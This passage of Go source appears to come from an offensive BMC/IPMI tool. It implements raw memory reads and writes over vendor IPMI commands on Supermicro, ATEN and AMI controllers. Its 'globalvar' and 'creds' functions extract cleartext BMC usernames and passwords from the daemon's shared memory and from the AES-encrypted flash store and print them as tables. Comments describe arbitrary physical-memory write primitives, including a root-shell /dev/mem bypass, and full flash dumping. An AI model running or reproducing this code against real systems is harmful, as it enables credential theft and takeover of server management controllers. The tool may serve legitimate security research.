		if lerr != nil {
			return nil, lerr
		}
		res.Physical = fmt.Sprintf("shmid_kernel 0x%08x", loc.Shp)
		res.Note = fmt.Sprintf("SysV shm key 0x%x, segment offset 0x%x (resolved per-page via the shmem walk, radix height %d)", key, addr, loc.Height)
		data, err = sess.MemReadShmSeg(ctx, p, loc, addr, length)
		stats.Requests = (length + p.MaxUnit - 1) / p.MaxUnit
	case ipmi.MemSpaceI2C:
		if o.slave == 0 {
			return nil, fmt.Errorf("space=i2c needs slave=<addr>")
		}
		data, stats, err = sess.MemReadI2C(ctx, p, addr, length, bus)
	case ipmi.MemSpaceSPD:
		data, stats, err = sess.MemReadSPD(ctx, p, addr, length, bus)
	case ipmi.MemSpaceFRU:
		data, stats, err = sess.MemReadFRU(ctx, addr, length, bus)
	case ipmi.MemSpaceSDR:
		var next uint16
		data, next, stats, err = sess.MemReadSDR(ctx, o.record, addr, length, bus)
		res.NextSDRID = fmt.Sprintf("0x%04x", next)
	case ipmi.MemSpaceMII:
		v, merr := sess.MemReadMII(p, byte(addr))
		if merr != nil {
			return nil, merr
		}
		data = []byte{byte(v >> 24), byte(v >> 16), byte(v >> 8), byte(v)}
		stats.Requests = 1
	case ipmi.MemSpaceCPU:
		if o.apmlPlane == ipmi.APMLMailbox && !o.apply {
			return nil, fmt.Errorf("the SMU mailbox plane makes the host CPU EXECUTE the numbered command rather than reading a register, " +
				"so it is gated like a write: add the bare token 'apply', or use apml=sbtsi / apml=sbrmi for a plain register read")
		}
		r, aerr := sess.APMLRead(p, o.apmlPlane, o.socket, uint16(addr), 0)
		if aerr != nil {
			return nil, aerr
		}
		return map[string]any{
			"action": "mem read", "profile": p.ID, "space": "cpu",
			"plane": string(r.Plane), "socket": r.Socket,
			"register": r.Register, "value": r.Value, "smuStatus": r.Status,
		}, nil
	case ipmi.MemSpacePECI:
		readLen := o.peciRead
		if readLen == 0 {
			readLen = length
		}
		data, err = sess.MemPECI(p, o.peciCmd, nil, readLen)
		stats.Requests = 1
	case ipmi.MemSpaceNVRAM:
		data, stats, err = sess.MemReadNVRAM(ctx, p, addr, length, bus)
	default:
		return nil, fmt.Errorf("space %s is not readable", o.space)
	}
	if err != nil && len(data) == 0 {
		return nil, err
	}
	if err != nil {
		res.Warning = strings.TrimSpace(res.Warning + " partial read: " + err.Error())
	}

	res.Requests = stats.Requests
	res.Retries = stats.Retries
	res.Length = len(data)
	res.data = data

	if o.outFile != "" {
		if werr := os.WriteFile(o.outFile, data, 0o600); werr != nil {
			return nil, fmt.Errorf("writing %s: %w", o.outFile, werr)
		}
		res.OutFile = o.outFile
	} else {
		res.Hexdump = memHexdump(data, addr)
		// json/jsonl marshal this struct verbatim, and Hexdump is not
		// serialised, so the hex has to be here or a JSON consumer gets a
		// result with no data in it at all.
		res.DataHex = hex.EncodeToString(data)
	}
	return res, nil
}

// --- globalvar (credential-table dump) --------------------------------------

// ipmiMemGlobalVarResult is the credential-table dump. It has a dedicated arm in
// printIPMIResultTable so the long password fields and the hexdump render as a
// compact table plus verbatim lines, not stuffed into a two-column key/value grid.
type ipmiMemGlobalVarResult struct {
	Action      string               `json:"action"`
	Profile     string               `json:"profile"`
	Key         string               `json:"key"`
	ShmidKernel string               `json:"shmidKernel"`
	RadixHeight uint32               `json:"radixHeight"`
	TableBase   string               `json:"tableBase"`
	UserCount   int                  `json:"userCount"`
	Users       []ipmi.ShmUserRecord `json:"users"`
	OutFile     string               `json:"outFile,omitempty"`
	TableHex    string               `json:"tableHex,omitempty"`
	Hexdump     []string             `json:"-"`
}

// ipmiMemGlobalVar locates the IPMI daemon's SysV shm config segment through the
// physical read primitive (a deterministic kernel page-cache walk) and dumps the
// cleartext user/name+password table straight out of DRAM. This is a shortcut
// past the offline credential-recovery path (flash JFFS2 walk + AES decrypt):
// the plaintext is resident in the daemon's shared segment and reads directly.
func ipmiMemGlobalVar(ctx context.Context, sess *ipmi.CmdSess, p *ipmi.MemProfile, o *ipmiMemOpts) (any, error) {
	if p.ShmWalk == nil {
		return nil, fmt.Errorf("profile %s has no shm-walk parameters: the GlobalVar dump needs pinned kernel constants, known only for builds verified live (currently smc-x11)", p.ID)
	}
	loc, users, raw, err := sess.MemDumpGlobalVarUsers(ctx, p)
	if err != nil {
		return nil, err
	}
	res := &ipmiMemGlobalVarResult{
		Action:      "mem globalvar",
		Profile:     p.ID,
		Key:         fmt.Sprintf("0x%x", loc.Key),
		ShmidKernel: fmt.Sprintf("0x%08x", loc.Shp),
		RadixHeight: loc.Height,
		TableBase:   fmt.Sprintf("seg+0x%x", p.ShmWalk.UserBase),
		UserCount:   len(users),
		Users:       users,
	}
	if o.outFile != "" {
		if werr := os.WriteFile(o.outFile, raw, 0o600); werr != nil {
			return nil, fmt.Errorf("writing %s: %w", o.outFile, werr)
		}
		res.OutFile = o.outFile
	} else {
		res.Hexdump = memHexdump(raw, p.ShmWalk.UserBase)
		res.TableHex = hex.EncodeToString(raw)
	}
	return res, nil
}

// writeMemGlobalVarResult renders the credential dump: a short key/value summary,
// a compact users table, then the raw-table hexdump verbatim.
func writeMemGlobalVarResult(w interface{ Write([]byte) (int, error) }, r *ipmiMemGlobalVarResult) error {
	kv := [][2]string{
		{"Profile", r.Profile},
		{"Segment", fmt.Sprintf("SysV shm key %s (shmid_kernel %s, radix height %d)", r.Key, r.ShmidKernel, r.RadixHeight)},
		{"Table", r.TableBase},
		{"Users", strconv.Itoa(r.UserCount)},
	}
	if r.OutFile != "" {
		kv = append(kv, [2]string{"Output file", r.OutFile})
	}
	for _, p := range kv {
		if _, err := fmt.Fprintf(w, "%-12s: %s\n", p[0], sanitizeASCII(p[1])); err != nil {
			return err
		}
	}
	if len(r.Users) > 0 {
		rows := make([][]string, 0, len(r.Users))
		for _, u := range r.Users {
			rows = append(rows, []string{strconv.Itoa(u.Slot), sanitizeASCII(u.Name), sanitizeASCII(u.Password)})
		}
		if _, err := fmt.Fprintln(w, ""); err != nil {
			return err
		}
		if err := writeASCIITable(w, []string{"Slot", "Username", "Cleartext password"}, rows); err != nil {
			return err
		}
	}
	if len(r.Hexdump) > 0 {
		if _, err := fmt.Fprintln(w, ""); err != nil {
			return err
		}
		for _, line := range r.Hexdump {
			if _, err := fmt.Fprintln(w, line); err != nil {
				return err
			}
		}
	}
	return nil
}

// --- creds (portable flash/JFFS2 credential dump) ---------------------------

// ipmiMemFlashCreds dumps BMC account credentials from the /nv JFFS2 store over
// the memory-mapped flash window. It is version-independent: no kernel offsets and
// no per-firmware constants, only the SoC flash window + the self-describing JFFS2
// format + the per-generation AES key (overridable with aeskey=/aesiv=).
func ipmiMemFlashCreds(ctx context.Context, sess *ipmi.CmdSess, p *ipmi.MemProfile, o *ipmiMemOpts) (any, error) {
	return sess.MemDumpCreds(ctx, p, o.aesKey, o.aesIV, o.via)
}

// writeFlashCredResult renders the portable credential dump: a summary, a table
// of recovered plaintext (username/password) strings, the parsed shadow table if
// present, then the walk notes.
func writeFlashCredResult(w interface{ Write([]byte) (int, error) }, r *ipmi.FlashCredResult) error {
	if _, err := fmt.Fprintf(w, "%-12s: %s\n", "Method", r.Method); err != nil {
		return err
	}
	if r.PartitionPhys != 0 {
		if _, err := fmt.Fprintf(w, "%-12s: 0x%08x (%d nodes)\n", "Partition", r.PartitionPhys, r.NodesWalked); err != nil {
			return err
		}
	}
	if len(r.FilesFound) > 0 {
		if _, err := fmt.Fprintf(w, "%-12s: %s\n", "Files", strings.Join(r.FilesFound, ", ")); err != nil {
			return err
		}
	}
	if len(r.Creds) > 0 {
		rows := make([][]string, 0, len(r.Creds))
		for _, c := range r.Creds {
			rows = append(rows, []string{c.File, fmt.Sprintf("0x%x", c.Offset), sanitizeASCII(c.Plaintext)})
		}
		if _, err := fmt.Fprintln(w, ""); err != nil {
			return err
		}
		if err := writeASCIITable(w, []string{"File", "Offset", "Recovered plaintext"}, rows); err != nil {
			return err
		}
	}
	if len(r.Shadow) > 0 {
		rows := make([][]string, 0, len(r.Shadow))
		for _, e := range r.Shadow {
			rows = append(rows, []string{e.ID, sanitizeASCII(e.Name), sanitizeASCII(e.Password), e.Priv, e.Enabled})
		}
		if _, err := fmt.Fprintln(w, ""); err != nil {
			return err
		}
		if err := writeASCIITable(w, []string{"ID", "Username", "Password", "Priv", "Enabled"}, rows); err != nil {
			return err
		}
	}
	if len(r.Creds) == 0 && len(r.Shadow) == 0 {
		if _, err := fmt.Fprintln(w, "(no credentials recovered)"); err != nil {
			return err
		}
	}
	for _, n := range r.Notes {
		if _, err := fmt.Fprintf(w, "  note: %s\n", sanitizeASCII(n)); err != nil {
			return err
		}
	}
	return nil
}

// --- write ------------------------------------------------------------------

func ipmiMemWrite(ctx context.Context, sess *ipmi.CmdSess, p *ipmi.MemProfile, det *ipmi.MemProfileDetection, o *ipmiMemOpts) (any, error) {
	if len(o.pos) < 1 {
		return nil, fmt.Errorf("usage: mem write <addr|region> <hexbytes...|in=FILE> [key=value ...] [apply]")
	}
	addr, region, err := parseMemAddr(p, o.pos[0])
	if err != nil {
		return nil, err
	}

	var data []byte
	switch {
	case o.inFile != "":
		if len(o.pos) > 1 {
			return nil, fmt.Errorf("invalid mem write: pass either in=FILE or literal bytes, not both")
		}
		if data, err = os.ReadFile(o.inFile); err != nil {
			return nil, fmt.Errorf("reading %s: %w", o.inFile, err)
		}
	case len(o.pos) >= 2:
		if data, err = parseMemWriteBytes(o.pos[1:]); err != nil {
			return nil, err
		}
	default:
		return nil, fmt.Errorf("usage: mem write <addr|region> <hexbytes...|in=FILE> [key=value ...] [apply]")
	}
	if len(data) == 0 {
		return nil, fmt.Errorf("invalid mem write: no data")
	}

	// via=shell: write BMC physical memory through the root shell + /dev/mem. This is
	// a full bypass of a firmware with NO physical-write primitive at all (production
	// H13, where 0xC1 is inert). Staged until 'apply'; 'verify' re-reads each word.
	if o.via == "shell" {
		return ipmiMemShellWrite(sess.Host(), uint32(addr), data, o)
	}

	// via=fwblock: the X10 "W9" arbitrary write over NetFn 0x3E (0x16/0x14/0x15), a
	// second BMC-physical write primitive independent of 0x30/0x70/0xC1. See
	// cmd/ipmi_mem_fwblock.go.
	if o.via == "fwblock" {
		return ipmiMemFWBlockWrite(ctx, sess, p, addr, data, o)
	}

	res := map[string]any{
		"action":  "mem write",
		"profile": p.ID,
		"space":   string(o.space),
		"address": fmt.Sprintf("0x%08x", addr),
		"length":  len(data),
	}
	if region != "" {
		res["region"] = region
	}
	if det != nil && det.Warning != "" {
		res["warning"] = det.Warning
	}
	if p.Hazards != "" {
		res["hazards"] = p.Hazards
	}
	if p.WriteSubFnAmbiguous && o.writeSub == nil {
		res["subfnCaveat"] = fmt.Sprintf("the kb carries two readings of this generation's write subfunction (0x%02x and 0x%02x); 0x%02x is the one two dedicated audits name by symbol. "+
			"If the other reading is right the request lands on the read handler and stores nothing - add 'verify' to detect that.", p.WriteSubFn, p.WriteSubFnAlt, p.WriteSubFn)
	}

	bus := ipmi.MemBusOptions{
		Bus: o.bus, Slave: o.slave, AddrBytes: o.addrBytes, Chunk: o.chunk,
		FRUID: o.fruID, UseOEM: o.useOEM,
		Retries: o.retries, Delay: o.delay,
	}

	if o.space == ipmi.MemSpaceGPIO && o.pin >= 0 {
		if len(data) != 1 {
			return nil, fmt.Errorf("invalid mem write: a GPIO pin write takes exactly one value byte")
		}
		res["pin"] = o.pin
		res["value"] = data[0]
		if !o.apply {
			res["applied"] = false
			res["note"] = "staged only: add the bare token 'apply' to drive the pin"
			return res, nil
		}
		if gerr := sess.GPIOPinWrite(p, byte(o.pin), data[0]); gerr != nil {
			return nil, gerr
		}
		res["applied"] = true
		res["ok"] = true
		return res, nil
	}

	if p.YAFUMemory {
		if o.space == ipmi.MemSpacePhysical {
			return nil, fmt.Errorf("profile %s has no physical-memory primitive: its write reaches the IPMI daemon's virtual address space, not the SoC. Ask for space=virtual if that is what you want", p.ID)
		}
		if o.space == ipmi.MemSpaceVirtual {
			return ipmiMemYAFUWrite(ctx, sess, p, addr, data, o, res)
		}
	}

	// Resolve the physical address up front so the staged preview shows the
	// bytes that would actually go on the wire.
	phys := addr
	switch o.space {
	case ipmi.MemSpacePhysical, ipmi.MemSpaceVirtual, ipmi.MemSpaceFlash, ipmi.MemSpaceSCU, ipmi.MemSpaceGPIO:
		var note string
		if phys, note, err = p.TranslateSpace(o.space, addr); err != nil {
			return nil, err
		}
		res["physical"] = fmt.Sprintf("0x%08x", phys)
		if note != "" {
			res["note"] = note
		}
		if !p.WriteSupported {
			return nil, fmt.Errorf("profile %s has no physical-memory write primitive (%s)", p.ID, p.Summary)
		}
		if !o.force && !p.AllowsPhysical(phys) {
			return nil, fmt.Errorf("0x%08x is outside the %s page allowlist; add the bare token 'force' to send it anyway", phys, p.ID)
		}
	}

	if !o.apply {
		res["applied"] = false
		preview, perr := memWritePreview(p, o, phys, data)
		if perr != nil {
			return nil, perr
		}
		res["wouldSend"] = preview
		prior, _ := res["note"].(string)
		res["note"] = strings.TrimSpace(prior + " staged only: add the bare token 'apply' to transmit")
		return res, nil
	}

	switch o.space {
	case ipmi.MemSpacePhysical, ipmi.MemSpaceVirtual, ipmi.MemSpaceFlash, ipmi.MemSpaceSCU, ipmi.MemSpaceGPIO:
		wr, werr := sess.MemWritePhysical(ctx, p, phys, data, ipmi.MemWriteOptions{
			Unit: o.unit, SubFn: o.writeSub, ReplyOrder: o.order,
			Retries: o.retries, Delay: o.delay, Verify: o.verify,
		})
		if wr != nil {
			res["requests"] = wr.Stats.Requests
			res["subfn"] = wr.SubFn
			res["verified"] = wr.Verified
			if len(wr.Mismatch) > 0 {
				m := make([]string, 0, len(wr.Mismatch))
				for _, a := range wr.Mismatch {
					m = append(m, fmt.Sprintf("0x%08x", a))
				}
				res["readbackMismatch"] = strings.Join(m, " ")
			}
		}
		if werr != nil {
			return res, werr
		}
	case ipmi.MemSpaceI2C, ipmi.MemSpaceSPD:
		if o.slave == 0 {
			return nil, fmt.Errorf("space=%s needs slave=<addr>", o.space)
		}
		st, werr := sess.MemWriteI2C(ctx, p, addr, data, bus)
		res["requests"] = st.Requests
		if werr != nil {
			return res, werr
		}
	case ipmi.MemSpaceFRU:
		st, werr := sess.MemWriteFRU(ctx, addr, data, bus)
		res["requests"] = st.Requests
		if werr != nil {
			return res, werr
		}
	case ipmi.MemSpaceMII:
		if len(data) != 4 {
			return nil, fmt.Errorf("invalid mem write: space=mii takes exactly 4 bytes")
		}
		v := uint32(data[0])<<24 | uint32(data[1])<<16 | uint32(data[2])<<8 | uint32(data[3])
		if werr := sess.MemWriteMII(p, byte(addr), v); werr != nil {
			return nil, werr
		}
		res["requests"] = 1
	case ipmi.MemSpacePECI:
		out, werr := sess.MemPECI(p, o.peciCmd, data, o.peciRead)
		if werr != nil {
			return nil, werr
		}
		res["requests"] = 1
		res["responseHex"] = hex.EncodeToString(out)
	case ipmi.MemSpaceCPU:
		if len(data) != 1 {
			return nil, fmt.Errorf("invalid mem write: space=cpu writes exactly one register byte")
		}
		r, aerr := sess.APMLWrite(p, o.apmlPlane, o.socket, uint16(addr), data[0])
		if aerr != nil {
			return nil, aerr
		}
		res["requests"] = 1
		res["plane"] = string(r.Plane)
		res["socket"] = r.Socket
		res["register"] = r.Register
	case ipmi.MemSpaceNVRAM:
		st, werr := sess.MemWriteNVRAM(ctx, p, addr, data, bus)
		res["requests"] = st.Requests
		if werr != nil {
			return res, werr
		}
	default:
		return nil, fmt.Errorf("space %s is not writable", o.space)
	}
	res["applied"] = true
	res["ok"] = true
	return res, nil
}

// memWritePreview renders the exact request bytes a staged write would send,
// so an operator can check them before committing.
func memWritePreview(p *ipmi.MemProfile, o *ipmiMemOpts, phys uint64, data []byte) (string, error) {
	switch o.space {
	case ipmi.MemSpacePhysical, ipmi.MemSpaceVirtual, ipmi.MemSpaceFlash, ipmi.MemSpaceSCU, ipmi.MemSpaceGPIO:
		unit := o.unit
		if unit == 0 {
			unit = p.MaxUnit
		}
		sub := p.WriteSubFn
		if o.writeSub != nil {
			sub = *o.writeSub
		}
		if unit != 1 && unit != 2 && unit != 4 {
			return "", fmt.Errorf("invalid unit %d (use 1, 2 or 4)", unit)
		}
		if phys%uint64(unit) != 0 {
			return "", fmt.Errorf("invalid mem write: 0x%x is not %d-byte aligned", phys, unit)
		}
		if len(data)%unit != 0 {
			return "", fmt.Errorf("invalid mem write: %d bytes is not a whole number of %d-byte units", len(data), unit)
		}
		lines := make([]string, 0, len(data)/unit)
		for i := 0; i < len(data) && i/unit < 4; i += unit {
			ua := phys + uint64(i)
			val := data[i : i+unit]
			wire := make([]byte, len(val))
			copy(wire, val)
			if unit > 1 {
				for j := range wire {
					wire[j] = val[len(val)-1-j]
				}
			}
			lines = append(lines, fmt.Sprintf("%02x %02x %02x %02x %02x %02x %02x %02x %s",
				p.ReadNetFn, p.ReadCmd, sub, byte(unit),
				byte(ua>>24), byte(ua>>16), byte(ua>>8), byte(ua),
				strings.ToLower(hex.EncodeToString(wire))))
		}
		if len(data)/unit > 4 {
			lines = append(lines, fmt.Sprintf("... %d requests total", len(data)/unit))
		}
		return strings.Join(lines, " | "), nil
	}
	return fmt.Sprintf("%d bytes to %s offset 0x%x", len(data), o.space, phys), nil
}

// parseMemWriteBytes accepts "deadbeef", "de ad be ef", "0xde 0xad" and
// "de:ad:be:ef".
func parseMemWriteBytes(args []string) ([]byte, error) {
	joined := strings.Join(args, " ")
	joined = strings.NewReplacer(":", " ", ",", " ", "0x", " ", "0X", " ").Replace(joined)
	fields := strings.Fields(joined)
	if len(fields) == 1 && len(fields[0])%2 == 0 {
		b, err := hex.DecodeString(fields[0])
		if err != nil {
			return nil, fmt.Errorf("invalid hex bytes %q", args[0])
		}
		return b, nil
	}
	out := make([]byte, 0, len(fields))
	for _, f := range fields {
		if len(f)%2 != 0 {
			f = "0" + f
		}
		b, err := hex.DecodeString(f)
		if err != nil {
			return nil, fmt.Errorf("invalid hex byte %q", f)
		}
		out = append(out, b...)
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("invalid hex bytes %q", joined)
	}
	return out, nil
}

// writeMemReadResult renders a dump under the standard result header. It is a
// dedicated arm of printIPMIResultTable because the generic key/value renderer
// collapses newlines and truncates cells to the column width, which would
// destroy a hexdump.
func writeMemReadResult(w interface{ Write([]byte) (int, error) }, r *ipmiMemReadResult) error {
	kv := [][2]string{
		{"Profile", r.Profile},
		{"Space", r.Space},
		{"Address", r.Address},
	}
	if r.Physical != "" && r.Physical != r.Address {
		kv = append(kv, [2]string{"Physical", r.Physical})
	}
	if r.Region != "" {
		kv = append(kv, [2]string{"Region", r.Region})
	}
	kv = append(kv, [2]string{"Length", strconv.Itoa(r.Length)})
	if r.Unit > 0 {
		kv = append(kv, [2]string{"Unit", fmt.Sprintf("%d byte(s) per request", r.Unit)})
	}
	if r.Order != "" {
		kv = append(kv, [2]string{"Reply order", r.Order})
	}
	kv = append(kv, [2]string{"Requests", strconv.Itoa(r.Requests)})
	if r.Retries > 0 {
		kv = append(kv, [2]string{"Retries", strconv.Itoa(r.Retries)})
	}
	if r.NextSDRID != "" {
		kv = append(kv, [2]string{"Next SDR record", r.NextSDRID})
	}
	if r.OutFile != "" {
		kv = append(kv, [2]string{"Output file", r.OutFile})
	}
	if len(r.Holes) > 0 {
		kv = append(kv, [2]string{"Holes", fmt.Sprintf("%d unit(s) unreadable", len(r.Holes))})
	}
	for _, p := range kv {
		if _, err := fmt.Fprintf(w, "%-16s: %s\n", p[0], sanitizeASCII(p[1])); err != nil {
			return err
		}
	}
	if r.Note != "" {
		if _, err := fmt.Fprintf(w, "%-16s: %s\n", "Note", sanitizeASCII(r.Note)); err != nil {
			return err
		}
	}
	if r.Warning != "" {
		if _, err := fmt.Fprintf(w, "%-16s: %s\n", "Warning", sanitizeASCII(r.Warning)); err != nil {
			return err
		}
	}
	for _, h := range r.Holes {
		detail := h.Err
		if h.CC != "" {
			detail = fmt.Sprintf("cc=%s %s", h.CC, h.Err)
		}
		if _, err := fmt.Fprintf(w, "  hole 0x%08x +%d: %s\n", h.Addr, h.Len, sanitizeASCII(detail)); err != nil {
			return err
		}
	}
	if len(r.Hexdump) > 0 {
		if _, err := fmt.Fprintln(w, ""); err != nil {
			return err
		}
		for _, line := range r.Hexdump {
			if _, err := fmt.Fprintln(w, line); err != nil {
				return err
			}
		}
	}
	return nil
}

// memHexdump renders classic 16-byte hexdump lines.
func memHexdump(data []byte, base uint64) []string {
	lines := make([]string, 0, (len(data)+15)/16)
	for off := 0; off < len(data); off += 16 {
		end := min(off+16, len(data))
		chunk := data[off:end]
		var h, a strings.Builder
		for i := range 16 {
			if i < len(chunk) {
				fmt.Fprintf(&h, "%02x ", chunk[i])
			} else {
				h.WriteString("   ")
			}
			if i == 7 {
				h.WriteByte(' ')
			}
		}
		for _, b := range chunk {
			if b >= 0x20 && b < 0x7f {
				a.WriteByte(b)
			} else {
				a.WriteByte('.')
			}
		}
		lines = append(lines, fmt.Sprintf("%08x  %s |%s|", base+uint64(off), h.String(), a.String()))
	}
	return lines
}

// ipmiMemFlashDump drives the ATEN WST whole-flash staging chain. The BMC owns
// the offset counter, so the stream starts at zero and cannot be seeked; the
// length argument bounds how much of it is pulled.
func ipmiMemFlashDump(ctx context.Context, sess *ipmi.CmdSess, p *ipmi.MemProfile, length int, o *ipmiMemOpts) (any, error) {
	if !p.FlashDumpSupported() {
		return nil, fmt.Errorf("profile %s does not carry the WST flash-dump chain", p.ID)
	}
	if err := sess.FlashDumpStart(); err != nil {
		return nil, fmt.Errorf("staging the dump: %w", err)
	}
	// Poll for readiness. The X11 measurement sat at not-ready for 25s and
	// never produced an image, so the wait is bounded and the failure is
	// reported as what it is rather than retried forever.
	deadline := time.Now().Add(60 * time.Second)
	// CheckDumpFlashComplete clears the flag as it reports it, so the size
	// captured here is the only one we get.
	var ready bool
	var size uint32
	for time.Now().Before(deadline) {
		var err error
		if ready, size, err = sess.FlashDumpStatus(); err != nil {
			return nil, err
		}
		if ready {
			break
		}
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		case <-time.After(2 * time.Second):
		}
	}
	if !ready {
		return nil, fmt.Errorf("the BMC never reported a staged dump within 60s; on X11 this chain answers but no image materialises (the slavetask consumer or the mtdblock5 partition is absent)")
	}
	data, dres, err := sess.FlashDumpRead(ctx, size, length, ipmi.MemReadOptions{Delay: o.delay})
	if err != nil && len(data) == 0 {
		return nil, err
	}
	res := &ipmiMemReadResult{
		Action: "mem read", Profile: p.ID, Space: "flash (WST streaming dump)",
		Address: "0x00000000", Length: len(data), Requests: dres.Requests,
		Note: fmt.Sprintf("staged image is %d bytes at 56 bytes/request; %s", dres.Size, dres.Note),
	}
	if err != nil {
		res.Warning = "partial dump: " + err.Error()
	}
	res.data = data
	if o.outFile != "" {
		if werr := os.WriteFile(o.outFile, data, 0o600); werr != nil {
			return nil, fmt.Errorf("writing %s: %w", o.outFile, werr)
		}
		res.OutFile = o.outFile
	} else {
		res.Hexdump = memHexdump(data, 0)
	}
	return res, nil
}

// --- AMI MegaRAC YAFU -------------------------------------------------------

// yafuPrepare resolves the checksum algorithm and, when the caller asked for
// it, arms flash mode. Arming is disruptive and is never implicit.
func yafuPrepare(ctx context.Context, sess *ipmi.CmdSess, o *ipmiMemOpts, res map[string]any) (ipmi.YAFUChecksum, error) {
	algo := o.checksum
	if o.probeSum {
		resolved, err := sess.YAFUResolveChecksum(ctx)
		if err != nil {
			return "", err
		}
		algo = resolved
		res["checksumResolved"] = string(algo)
	}
	if o.disarm && !o.apply {
		return "", fmt.Errorf("invalid mem request: 'disarm' changes BMC state (it leaves firmware-update mode and can reset the controller), so it also needs the 'apply' token")
	}
	if o.arm {
		if !o.apply {
			return "", fmt.Errorf("invalid mem request: 'arm' puts the BMC into firmware-update mode (PrepareFlashArea plus a constant system() call) and is disruptive, so it also needs the 'apply' token")
		}
		if err := sess.YAFUArm(algo); err != nil {
			return "", err
		}
		res["armed"] = true
	}
	return algo, nil
}

func ipmiMemYAFURead(ctx context.Context, sess *ipmi.CmdSess, p *ipmi.MemProfile, addr uint64, length int, o *ipmiMemOpts) (any, error) {
	res := &ipmiMemReadResult{
		Action:  "mem read",
		Profile: p.ID,
		Space:   "virtual (AMI YAFU, IPMIMain address space)",
		Address: fmt.Sprintf("0x%08x", addr),
		Length:  length,
		Note:    "this is the IPMI daemon's virtual address space, not BMC physical memory: SoC register pages are not reachable, and an unmapped address SIGSEGVs IPMIMain",
	}
	meta := map[string]any{}
	algo, err := yafuPrepare(ctx, sess, o, meta)
	if err != nil {
		return nil, err
	}
	if v, ok := meta["checksumResolved"].(string); ok {
		res.Note += "; resolved checksum " + v
	}
	if o.arm {
		res.Warning = "flash mode was armed: the BMC is now in firmware-update mode. Add 'disarm' to leave it."
	}

	data, stats, rerr := sess.MemReadYAFU(ctx, addr, length, algo, ipmi.MemReadOptions{
		Unit: o.chunk, Retries: o.retries, Delay: o.delay,
	})
	if o.disarm {
		if derr := sess.YAFUDisarm(algo); derr != nil {
			res.Warning = strings.TrimSpace(res.Warning + " leaving flash mode failed: " + derr.Error())
		}
	}
	if rerr != nil && len(data) == 0 {
		return nil, rerr
	}
	if rerr != nil {
		res.Warning = strings.TrimSpace(res.Warning + " partial read: " + rerr.Error())
	}
	res.Requests = stats.Requests
	res.Retries = stats.Retries
	res.Length = len(data)
	res.data = data
	if o.outFile != "" {
		if werr := os.WriteFile(o.outFile, data, 0o600); werr != nil {
			return nil, fmt.Errorf("writing %s: %w", o.outFile, werr)
		}
		res.OutFile = o.outFile
	} else {
		res.Hexdump = memHexdump(data, addr)
	}
	return res, nil
}

func ipmiMemYAFUWrite(ctx context.Context, sess *ipmi.CmdSess, p *ipmi.MemProfile, addr uint64, data []byte, o *ipmiMemOpts, res map[string]any) (any, error) {
	res["space"] = "virtual (AMI YAFU, IPMIMain address space)"
	if !o.apply {
		res["applied"] = false
		res["wouldSend"] = fmt.Sprintf("NetFn 0x32 cmd 0x31, %d byte(s) to virtual 0x%08x in 128-byte chunks", len(data), addr)
		res["note"] = "staged only: add the bare token 'apply' to transmit. Writing an unmapped address SIGSEGVs IPMIMain"
		return res, nil
	}
	algo, err := yafuPrepare(ctx, sess, o, res)
	if err != nil {
		return nil, err
	}
	st, werr := sess.MemWriteYAFU(ctx, addr, data, algo, ipmi.MemWriteOptions{
		Retries: o.retries, Delay: o.delay,
	})
	res["requests"] = st.Requests
	if o.disarm {
		if derr := sess.YAFUDisarm(algo); derr != nil {
			res["disarmError"] = derr.Error()
		}
	}
	if werr != nil {
		return nil, werr
	}
	res["applied"] = true
	res["ok"] = true
	return res, nil
}
